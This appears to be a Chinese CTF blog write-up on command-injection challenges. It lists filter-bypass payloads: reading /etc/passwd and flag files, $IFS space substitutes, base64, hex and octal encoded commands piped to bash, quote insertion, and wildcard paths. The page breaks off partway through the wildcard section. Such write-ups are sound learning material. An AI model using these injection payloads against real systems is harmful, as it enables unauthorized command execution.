

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noodp" />
    <title>ctfshow_rce - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="ctfshow_rce" />
<meta property="og:description" content="ctfshow命令/代码执行专题" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://scofield1920.github.io/ctfshow_rce/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-11-17T00:00:00+08:00" />
<meta property="article:modified_time" content="2023-11-17T00:00:00+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/>

<meta name="twitter:title" content="ctfshow_rce"/>
<meta name="twitter:description" content="ctfshow命令/代码执行专题"/>
<meta name="application-name" content="scofield-blog">
<meta name="apple-mobile-web-app-title" content="scofield-blog">

<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/ctfshow_rce/" /><link rel="prev" href="http://scofield1920.github.io/ctfshow_xxe/" /><link rel="next" href="http://scofield1920.github.io/ctfshow_file_upload/" />
<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "ctfshow_rce",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/scofield1920.github.io\/ctfshow_rce\/"
        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "CTF, web","wordcount":  4777 ,
        "url": "http:\/\/scofield1920.github.io\/ctfshow_rce\/","datePublished": "2023-11-17T00:00:00+08:00","dateModified": "2023-11-17T00:00:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": {
                    "@type": "ImageObject",
                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
                    "width":  528 ,
                    "height":  560 
                }},"author": {
                "@type": "Person",
                "name": "Sc0fie1d"
            },"description": ""
    }
    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
</head>

<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
        window.switchThemeEventSet = new Set()
    </script>
    <div id="back-to-top"></div>
    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Sc0fie1d"><span id="desktop-header-typeit" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
                        <option value="light">Light</option>
                        <option value="dark">Dark</option>
                        <option value="black">Black</option>
                        <option value="auto">Auto</option>
                    </select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Sc0fie1d"><span id="mobile-header-typeit" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
                    <option value="light">Light</option>
                    <option value="dark">Dark</option>
                    <option value="black">Black</option>
                    <option value="auto">Auto</option>
                </select>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
            <div class="container"><div class="toc" id="toc-auto">
        <h2 class="toc-title">Contents</h2>
        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
  <ul>
    <li><a href="#总结">总结：</a></li>
    <li><a href="#文件读取可代替命令">文件读取可代替命令</a></li>
    <li><a href="#空格绕过">空格绕过</a></li>
    <li><a href="#编码绕过">编码绕过</a></li>
    <li><a href="#进制绕过">进制绕过</a></li>
    <li><a href="#分隔符过滤绕过">分隔符过滤绕过</a></li>
    <li><a href="#符号绕过正则">符号绕过正则</a></li>
    <li><a href="#通配符绕过正则">通配符绕过正则</a>
      <ul>
        <li><a href="#可以通配得到的命令">可以通配得到的命令</a></li>
        <li><a href="#字符串通配">字符串通配</a></li>
      </ul>
    </li>
    <li><a href="#变量拼接绕过正则">变量拼接绕过正则</a></li>
    <li><a href="#输入字符串长度限制">输入字符串长度限制</a></li>
    <li><a href="#内联执行">内联执行</a></li>
    <li><a href="#截取环境变量拼接">“${}”截取环境变量拼接</a></li>
    <li><a href="#中括号匹配绕过">[]中括号匹配绕过</a></li>
    <li><a href="#source命令">source命令：</a></li>
    <li><a href="#嵌套eval函数绕过">嵌套eval函数绕过</a></li>
    <li><a href="#已知的其他函数拼凑所需字符串">已知的其他函数拼凑所需字符串</a></li>
    <li><a href="#无回显rce"><strong>无回显rce</strong></a>
      <ul>
        <li><a href="#复制到可访问文件">复制到可访问文件</a></li>
        <li><a href="#dnslog外带数据">dnslog外带数据</a></li>
        <li><a href="#devnull-21类无回显">&gt;/dev/null 2&gt;&amp;1类无回显</a></li>
      </ul>
    </li>
    <li><a href="#uaf脚本绕过disable_function">uaf脚本绕过disable_function</a></li>
    <li><a href="#无字母数字rce">无字母数字RCE</a>
      <ul>
        <li><a href="#异或">异或</a></li>
        <li><a href="#或">或</a></li>
        <li><a href="#取反">取反</a></li>
      </ul>
    </li>
    <li><a href="#php封装协议">PHP封装协议</a></li>
    <li><a href="#写入webshell">写入webshell</a>
      <ul>
        <li><a href="#echo直接写入">echo直接写入</a>
          <ul>
            <li><a href="#linux"><strong>linux</strong></a></li>
            <li><a href="#windows"><strong>windows</strong></a></li>
          </ul>
        </li>
        <li><a href="#转换编码写入">转换编码写入</a>
          <ul>
            <li><a href="#linux-1">Linux</a></li>
            <li><a href="#windows-1">windows</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#靶场题目">靶场题目：</a>
      <ul>
        <li><a href="#web29">[web29]</a></li>
        <li><a href="#web30">[web30]</a></li>
        <li><a href="#web31">[web31]</a></li>
        <li><a href="#web32web36">[web32~web36]</a></li>
        <li><a href="#web37文件包含">[web37]文件包含</a></li>
        <li><a href="#web38">[web38]</a></li>
        <li><a href="#web39">[web39]</a></li>
        <li><a href="#web40">[web40]</a></li>
        <li><a href="#web41">[web41]</a></li>
        <li><a href="#web42">[web42]</a></li>
        <li><a href="#web43">[web43]</a></li>
        <li><a href="#web44">[web44]</a></li>
        <li><a href="#web45">[web45]</a></li>
        <li><a href="#web46">[web46]</a></li>
        <li><a href="#web47">[web47]</a></li>
        <li><a href="#web48">[web48]</a></li>
        <li><a href="#web50">[web50]</a></li>
        <li><a href="#web51">[web51]</a></li>
        <li><a href="#web52">[web52]</a></li>
        <li><a href="#web53">[web53]</a></li>
        <li><a href="#web54">[web54]</a></li>
        <li><a href="#web55">[web55]</a></li>
        <li><a href="#web56">[web56]</a></li>
        <li><a href="#web57">[web57]</a></li>
        <li><a href="#web58">[web58]</a></li>
        <li><a href="#web66">[web66]</a></li>
        <li><a href="#web68">[web68]</a></li>
        <li><a href="#web69">[web69]</a></li>
        <li><a href="#web71">[web71]</a></li>
        <li><a href="#web72">[web72]</a></li>
        <li><a href="#web73">[web73]</a></li>
        <li><a href="#web75">[web75]</a></li>
        <li><a href="#web77">[web77]</a></li>
        <li><a href="#web118">[web118]</a></li>
        <li><a href="#web119">[web119]</a></li>
        <li><a href="#web120">[web120]</a></li>
        <li><a href="#web121">[web121]</a></li>
        <li><a href="#web122">[web122]</a></li>
        <li><a href="#web124">[web124]</a>
          <ul>
            <li><a href="#解析">解析</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav></div>
    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">ctfshow_rce</h1><div class="post-meta">
            <div class="post-meta-line">
                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;4777 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;23 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#总结">总结：</a></li>
    <li><a href="#文件读取可代替命令">文件读取可代替命令</a></li>
    <li><a href="#空格绕过">空格绕过</a></li>
    <li><a href="#编码绕过">编码绕过</a></li>
    <li><a href="#进制绕过">进制绕过</a></li>
    <li><a href="#分隔符过滤绕过">分隔符过滤绕过</a></li>
    <li><a href="#符号绕过正则">符号绕过正则</a></li>
    <li><a href="#通配符绕过正则">通配符绕过正则</a>
      <ul>
        <li><a href="#可以通配得到的命令">可以通配得到的命令</a></li>
        <li><a href="#字符串通配">字符串通配</a></li>
      </ul>
    </li>
    <li><a href="#变量拼接绕过正则">变量拼接绕过正则</a></li>
    <li><a href="#输入字符串长度限制">输入字符串长度限制</a></li>
    <li><a href="#内联执行">内联执行</a></li>
    <li><a href="#截取环境变量拼接">“${}”截取环境变量拼接</a></li>
    <li><a href="#中括号匹配绕过">[]中括号匹配绕过</a></li>
    <li><a href="#source命令">source命令：</a></li>
    <li><a href="#嵌套eval函数绕过">嵌套eval函数绕过</a></li>
    <li><a href="#已知的其他函数拼凑所需字符串">已知的其他函数拼凑所需字符串</a></li>
    <li><a href="#无回显rce"><strong>无回显rce</strong></a>
      <ul>
        <li><a href="#复制到可访问文件">复制到可访问文件</a></li>
        <li><a href="#dnslog外带数据">dnslog外带数据</a></li>
        <li><a href="#devnull-21类无回显">&gt;/dev/null 2&gt;&amp;1类无回显</a></li>
      </ul>
    </li>
    <li><a href="#uaf脚本绕过disable_function">uaf脚本绕过disable_function</a></li>
    <li><a href="#无字母数字rce">无字母数字RCE</a>
      <ul>
        <li><a href="#异或">异或</a></li>
        <li><a href="#或">或</a></li>
        <li><a href="#取反">取反</a></li>
      </ul>
    </li>
    <li><a href="#php封装协议">PHP封装协议</a></li>
    <li><a href="#写入webshell">写入webshell</a>
      <ul>
        <li><a href="#echo直接写入">echo直接写入</a>
          <ul>
            <li><a href="#linux"><strong>linux</strong></a></li>
            <li><a href="#windows"><strong>windows</strong></a></li>
          </ul>
        </li>
        <li><a href="#转换编码写入">转换编码写入</a>
          <ul>
            <li><a href="#linux-1">Linux</a></li>
            <li><a href="#windows-1">windows</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#靶场题目">靶场题目：</a>
      <ul>
        <li><a href="#web29">[web29]</a></li>
        <li><a href="#web30">[web30]</a></li>
        <li><a href="#web31">[web31]</a></li>
        <li><a href="#web32web36">[web32~web36]</a></li>
        <li><a href="#web37文件包含">[web37]文件包含</a></li>
        <li><a href="#web38">[web38]</a></li>
        <li><a href="#web39">[web39]</a></li>
        <li><a href="#web40">[web40]</a></li>
        <li><a href="#web41">[web41]</a></li>
        <li><a href="#web42">[web42]</a></li>
        <li><a href="#web43">[web43]</a></li>
        <li><a href="#web44">[web44]</a></li>
        <li><a href="#web45">[web45]</a></li>
        <li><a href="#web46">[web46]</a></li>
        <li><a href="#web47">[web47]</a></li>
        <li><a href="#web48">[web48]</a></li>
        <li><a href="#web50">[web50]</a></li>
        <li><a href="#web51">[web51]</a></li>
        <li><a href="#web52">[web52]</a></li>
        <li><a href="#web53">[web53]</a></li>
        <li><a href="#web54">[web54]</a></li>
        <li><a href="#web55">[web55]</a></li>
        <li><a href="#web56">[web56]</a></li>
        <li><a href="#web57">[web57]</a></li>
        <li><a href="#web58">[web58]</a></li>
        <li><a href="#web66">[web66]</a></li>
        <li><a href="#web68">[web68]</a></li>
        <li><a href="#web69">[web69]</a></li>
        <li><a href="#web71">[web71]</a></li>
        <li><a href="#web72">[web72]</a></li>
        <li><a href="#web73">[web73]</a></li>
        <li><a href="#web75">[web75]</a></li>
        <li><a href="#web77">[web77]</a></li>
        <li><a href="#web118">[web118]</a></li>
        <li><a href="#web119">[web119]</a></li>
        <li><a href="#web120">[web120]</a></li>
        <li><a href="#web121">[web121]</a></li>
        <li><a href="#web122">[web122]</a></li>
        <li><a href="#web124">[web124]</a>
          <ul>
            <li><a href="#解析">解析</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>ctfshow命令/代码执行专题</p>
<h2 id="总结" class="headerLink">
    <a href="#%e6%80%bb%e7%bb%93" class="header-mark"></a>总结：</h2><h2 id="文件读取可代替命令" class="headerLink">
    <a href="#%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96%e5%8f%af%e4%bb%a3%e6%9b%bf%e5%91%bd%e4%bb%a4" class="header-mark"></a>文件读取可代替命令</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">more:一页一页的显示档案内容
</span></span><span class="line"><span class="cl">less:与 more 类似
</span></span><span class="line"><span class="cl">head:查看头几行
</span></span><span class="line"><span class="cl">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
</span></span><span class="line"><span class="cl">tail:查看尾几行
</span></span><span class="line"><span class="cl">nl：显示的时候，顺便输出行号
</span></span><span class="line"><span class="cl">od:以二进制的方式读取档案内容
</span></span><span class="line"><span class="cl">vi:一种编辑器，这个也可以查看
</span></span><span class="line"><span class="cl">vim:一种编辑器，这个也可以查看
</span></span><span class="line"><span class="cl">sort:可以查看
</span></span><span class="line"><span class="cl">uniq:可以查看
</span></span><span class="line"><span class="cl">file -f:报错出具体内容
</span></span><span class="line"><span class="cl">rev:逆序查看
</span></span></code></pre></td></tr></table>
</div>
</div><p>以及：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl file:///flag
</span></span><span class="line"><span class="cl">strings /flag
</span></span><span class="line"><span class="cl">uniq -c/etc/passwd
</span></span><span class="line"><span class="cl">bash -v /etc/passwd
</span></span><span class="line"><span class="cl">rev /etc/passwd
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="空格绕过" class="headerLink">
    <a href="#%e7%a9%ba%e6%a0%bc%e7%bb%95%e8%bf%87" class="header-mark"></a>空格绕过</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;
</span></span><span class="line"><span class="cl">&lt;&gt;				//重定向符
</span></span><span class="line"><span class="cl">%20				//(space)
</span></span><span class="line"><span class="cl">%09				//(tab)
</span></span><span class="line"><span class="cl">$IFS$9 
</span></span><span class="line"><span class="cl">${IFS}			//最好用这个
</span></span><span class="line"><span class="cl">$IFS  
</span></span><span class="line"><span class="cl">{cat,flag.txt} 	//在大括号中逗号可起分隔作用
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="编码绕过" class="headerLink">
    <a href="#%e7%bc%96%e7%a0%81%e7%bb%95%e8%bf%87" class="header-mark"></a>编码绕过</h2><p>Base64编码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>root@kali flag123<span class="o">]</span><span class="c1"># echo &#39;cat&#39; | base64</span>
</span></span><span class="line"><span class="cl"><span class="nv">Y2F0Cg</span><span class="o">==</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>root@kali flag123<span class="o">]</span><span class="c1"># `echo &#39;Y2F0Cg==&#39; | base64 -d` flag</span>
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>suifeng<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="进制绕过" class="headerLink">
    <a href="#%e8%bf%9b%e5%88%b6%e7%bb%95%e8%bf%87" class="header-mark"></a>进制绕过</h2><p><strong>16进制</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>root~<span class="o">]</span><span class="c1"># echo cat flag.txt | xxd </span>
</span></span><span class="line"><span class="cl"><span class="m">6361</span> <span class="m">7420</span> 666c <span class="m">6167</span> 2e74 <span class="m">7874</span> 0a
</span></span><span class="line"><span class="cl"><span class="o">[</span>root~<span class="o">]</span><span class="c1"># echo 6361 7420 666c 6167 2e74 7874 0a | xxd -r -p</span>
</span></span><span class="line"><span class="cl">cat flag.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>root~<span class="o">]</span><span class="c1"># echo 6361 7420 666c 6167 2e74 7874 0a | xxd -r -p | bash  或 | sh</span>
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>flag_is_here<span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>root~<span class="o">]</span><span class="c1"># $(printf &#34;\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74&#34;)  //cat flag.txt 16进制</span>
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>flag_is_here<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>8进制</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>root~<span class="o">]</span><span class="c1"># $(printf &#34;\143\141\164\40\146\154\141\147\56\164\170\164&#34;)  </span>
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>flag_is_here<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="分隔符过滤绕过" class="headerLink">
    <a href="#%e5%88%86%e9%9a%94%e7%ac%a6%e8%bf%87%e6%bb%a4%e7%bb%95%e8%bf%87" class="header-mark"></a>分隔符过滤绕过</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?&gt;
</span></span><span class="line"><span class="cl">||
</span></span><span class="line"><span class="cl">%0a
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="符号绕过正则" class="headerLink">
    <a href="#%e7%ac%a6%e5%8f%b7%e7%bb%95%e8%bf%87%e6%ad%a3%e5%88%99" class="header-mark"></a>符号绕过正则</h2><p>单双引号</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ca&#39;&#39;t flag.txt
</span></span><span class="line"><span class="cl">ca&#34;&#34;t flag.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>跨行符<code>'\'</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ca\t flag.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>$*</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ca$*t flag.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>$@</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ca$@t flag.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>$x或${x}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ca$3t flag.txt
</span></span><span class="line"><span class="cl">ca${3}t flag.txt
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="通配符绕过正则" class="headerLink">
    <a href="#%e9%80%9a%e9%85%8d%e7%ac%a6%e7%bb%95%e8%bf%87%e6%ad%a3%e5%88%99" class="header-mark"></a>通配符绕过正则</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell通配符有：
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">* ：表示通配字符0次及以上
</span></span><span class="line"><span class="cl">? : 表示通配字符0或
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="可以通配得到的命令" class="headerLink">
    <a href="#%e5%8f%af%e4%bb%a5%e9%80%9a%e9%85%8d%e5%be%97%e5%88%b0%e7%9a%84%e5%91%bd%e4%bb%a4" class="header-mark"></a>可以通配得到的命令</h3><p>base64：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/bin/base64 可以通配为：
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">/???/????64
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">作用为将文件以base64编码形式输出
</span></span></code></pre></td></tr></table>
</div>
</div><p>bzip2：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/usr/bin/bzip2 可以通配为：
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">/???/???/????2
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">作用为将文件压缩成后缀为bz2的压缩文件
</span></span><span class="line"><span class="cl">flag.php ==&gt;  flag.php.bz2
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="字符串通配" class="headerLink">
    <a href="#%e5%ad%97%e7%ac%a6%e4%b8%b2%e9%80%9a%e9%85%8d" class="header-mark"></a>字符串通配</h3><div class="highlight"><div class="chroma">
